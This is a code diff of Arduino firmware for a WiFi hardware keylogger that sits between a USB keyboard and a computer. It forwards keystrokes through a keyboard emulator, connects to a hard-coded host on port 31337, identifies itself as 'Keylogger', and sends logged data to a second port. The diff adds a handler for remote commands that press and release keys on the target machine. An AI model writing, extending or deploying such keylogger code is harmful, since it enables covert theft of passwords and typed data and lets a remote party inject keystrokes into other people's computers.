@@ -1,4 +1,9 @@
+#define USE_LCD
+
+#ifdef USE_LCD
 #include <LiquidCrystal.h>
+LiquidCrystal lcd(A5, A4, A3, A2, A1, A0);
+#endif
 
 #include <SPI.h>
 #include <Adafruit_WINC1500.h>
@@ -30,24 +35,21 @@ char ssid[] = "xXSwaggernautsXx";     //  your network SSID (name)
 char pass[] = "chillywilly";    // your network password (use for WPA, or use as key for WEP)
 int keyIndex = 0;                // your network key Index number (needed only for WEP)
 
-IPAddress host(192,168,1,32);
-LiquidCrystal lcd(A5, A4, A3, A2, A1, A0);
-//char host[] = "www.intense.io";
+// Change below hosts and ports as necessary
+IPAddress host(172,16,103,57);
+//char host[] = "";
 int port = 31337;
 //char *debughost = host;
 IPAddress debughost = host;
 int debugport = 31338;
 
-// Initialize the Ethernet client library
-// with the IP address and port of the server
-// that you want to connect to (port 80 is default for HTTP):
 Adafruit_WINC1500Client client;
 Adafruit_WINC1500Client debug;
 KeyboardHandler handler;
 CircularBuffer<char*> logBuffer;
+CircularBuffer<uint8_t> inputBuffer; 
 
 uint32_t last_connect_attempt;
-uint32_t last_transfer_attempt;
 bool connect_in_progress;
 
 uint16_t max_transfer_time = 50;
@@ -57,9 +59,16 @@ uint8_t keyboard_modifiers = 0;
 
 void addToLog(char *output);
 
+#ifdef USE_LCD
 int line = 0;
-int statch = 0;
-char stat[] = "/|\-";
+#endif
+
+extern "C" char *sbrk(int i);
+ 
+int FreeRam () {
+  char stack_dummy = 0;
+  return &stack_dummy - sbrk(0);
+}
 
 inline bool isConnected() {
   return WiFi.status() == WL_CONNECTED && client.connected();
@@ -75,55 +84,79 @@ void halt() {
 }
 
 void setup() {
+  // Tell the Teensy to reset keyboard communications by triggering interrupt
+  pinMode(5, OUTPUT);
+  digitalWrite(5, LOW);
+  
+  // Begin serial communications with USB keyboard emulator
+  Serial1.begin(57600);
 
+  #ifdef USE_LCD
   lcd.begin(20,4);
+  lcd.clear();
+  lcd.setCursor(0, line++ % 3);
+  lcd.print("Initializing");
+  #endif
   
   #ifdef WINC_EN
   pinMode(WINC_EN, OUTPUT);
   digitalWrite(WINC_EN, HIGH);
   #endif
 
-  lcd.clear();
-    lcd.setCursor(0, line++ % 3);
-  lcd.print("Initializing");
-
   pinMode(STAT_LED, OUTPUT);
   digitalWrite(STAT_LED, HIGH);
 
   // Halt if no WiFi hardware installed
   if(WiFi.status() == WL_NO_SHIELD) {
+    #ifdef USE_LCD
     lcd.setCursor(0, line++ % 3);
     lcd.print("No shield");
+    #endif
     halt();
   }
 
-    lcd.setCursor(0, line++ % 3);
+  #ifdef USE_LCD
+  lcd.setCursor(0, line++ % 3);
   lcd.print("Init USB");
+  #endif
+  
   handler.setLogCallback(addToLog);
   handler.init();
-
-  // Begin serial communications with USB keyboard emulator
-  Serial1.begin(9600);
-  //Serial1.write(CMD_START);
 
   // Assumes WPA/WPA2 network, attempt to connect
   last_connect_attempt = millis();
   connect_in_progress = true;
 
-  // Change below line if using unsecured or WEP network (not recommended)
+  #ifdef USE_LCD
   lcd.setCursor(0, line++ % 3);
   lcd.print("Begin connect");
   lcd.setCursor(0, 3);
+  lcd.print("     /32768");
+  #endif
+  // Change below line if using unsecured or WEP network (not recommended)
   WiFi.beginAsync(ssid, pass);
+  //setupWDT(11);
 }
 
+unsigned long lastTime = millis();
+char strbuf[16];
+
 void loop() {
+  unsigned long t = lastTime;
+  lastTime = millis();
   handler.task();
   WiFi.refresh();
 
-  lcd.setCursor(19, 3);
-  lcd.print(stat[statch++]);
-  statch = statch % 4;
+  #ifdef USE_LCD
+  lcd.setCursor(0,3);
+  sprintf(strbuf, "%05d/32768", FreeRam());
+  lcd.print(strbuf);
+  
+  lcd.setCursor(13, 3);
+  int delta = (int) lastTime - t;
+  sprintf(strbuf, "%05dms", delta);
+  lcd.print(strbuf);
+  #endif
   
   // Attempt to connect/reconnect if disconnected
   switch(WiFi.status()) {
@@ -131,8 +164,11 @@ void loop() {
       if(connect_in_progress && millis() - last_connect_attempt > 5000) {
         last_connect_attempt = millis();
         if(client.connect(host, port) && debug.connect(debughost, debugport)) {
+          #ifdef USE_LCD
           lcd.setCursor(0, line++ % 3);
-          lcd.print("Connected");
+          lcd.print("Connected   ");
+          #endif
+          
           connect_in_progress = false;
           digitalWrite(STAT_LED, LOW);
           client.println("Keylogger");
@@ -147,40 +183,41 @@ void loop() {
         break;
       }
     default:
+      #ifdef USE_LCD
       lcd.setCursor(0, line++ % 3);
       lcd.print("Connection failed");
+      #endif
       digitalWrite(STAT_LED, HIGH);
       last_connect_attempt = millis();
       connect_in_progress = true;
       WiFi.beginAsync(ssid, pass);
   }
   
-  last_transfer_attempt = millis();
   if(isConnected() && logBuffer.getNumEntries() > 0) {
     char *str = logBuffer.peek();
     size_t err = debug.writeAsync((uint8_t*)str, strlen(str));
     if(err >= 0) logBuffer.remove();
   }
-  /*
-  while(logBuffer.getNumEntries() > 0) {
-    debug.write(logBuffer.removeFirst());
-  }
-  debug.flush();
-  */
-  /*
+
   // handle incoming commands from the server
-  while(isConnected() && client.available() > 0 && millis() - last_transfer_attempt < max_transfer_time) {
-    uint8_t command = client.read();
-    switch(command) {
+  if(client.available() > 0) {
+    uint8_t socketBuf[128];
+    int bytesRead = client.read(socketBuf, 128);
+    inputBuffer.add(socketBuf, bytesRead);
+  }
+  while(inputBuffer.getNumEntries() >= 3) {
+    uint8_t command[3];
+    inputBuffer.remove(command, 3);
+    switch(command[0]) {
       case CMD_PRESS:
-        Keyboard.press(client.read());
-        break;
       case CMD_RELEASE:
-        Keyboard.release(client.read());
+      case CMD_CHANGEMOD:
+        Serial1.write(command, 3);
+        break;
+      default:
         break;
     }
   }
-  */
 }
 
 
@@ -202,37 +239,31 @@ void printWifiStatus() {
 }
 
 void controlKeysChanged() {
-  uint8_t cmd = (uint8_t) (CMD_CHANGEMOD & 0xFF);
-  Serial1.write(cmd);
   int key = handler.getModifiers();
-  uint8_t buf[2];
-  buf[0] = (uint8_t) ((key & 0xFF00) >> 8);
-  buf[1] = (uint8_t) (key & 0xFF);
-  Serial1.write(buf[0]);
-  Serial1.write(buf[1]);
+  uint8_t command[3];
+  command[0] = (uint8_t) (CMD_CHANGEMOD & 0xFF);
+  command[1] = (uint8_t) ((key & 0xFF00) >> 8);
+  command[2] = (uint8_t) (key & 0xFF);
+  Serial1.write(command, 3);
 }
 
 void keyPressed() {
-  handler.pressed(handler.getOemKey() & 0xff);
-  uint8_t cmd = (uint8_t) (CMD_PRESS & 0xFF);
-  Serial1.write(cmd);
   int key = handler.getOemKey();
-  uint8_t buf[2];
-  buf[0] = (uint8_t) ((key & 0xFF00) >> 8);
-  buf[1] = (uint8_t) (key & 0xFF);
-  Serial1.write(buf[0]);
-  Serial1.write(buf[1]);
+  uint8_t command[3];
+  command[0] = (uint8_t) (CMD_PRESS & 0xFF);
+  command[1] = (uint8_t) ((key & 0xFF00) >> 8);
+  command[2] = (uint8_t) (key & 0xFF);
+  Serial1.write(command, 3);
+  handler.released(key & 0xFF);
 }
 void keyReleased() {
-  handler.released(handler.getOemKey() & 0xff);
-  uint8_t cmd = (uint8_t) (CMD_RELEASE & 0xFF);
-  Serial1.write(cmd);
   int key = handler.getOemKey();
-  uint8_t buf[2];
-  buf[0] = (uint8_t) ((key & 0xFF00) >> 8);
-  buf[1] = (uint8_t) (key & 0xFF);
-  Serial1.write(buf[0]);
-  Serial1.write(buf[1]);
+  uint8_t command[3];
+  command[0] = (uint8_t) (CMD_RELEASE & 0xFF);
+  command[1] = (uint8_t) ((key & 0xFF00) >> 8);
+  command[2] = (uint8_t) (key & 0xFF);
+  Serial1.write(command, 3);
+  handler.pressed(key & 0xFF);
 }
 
 void addToLog(char *output) {
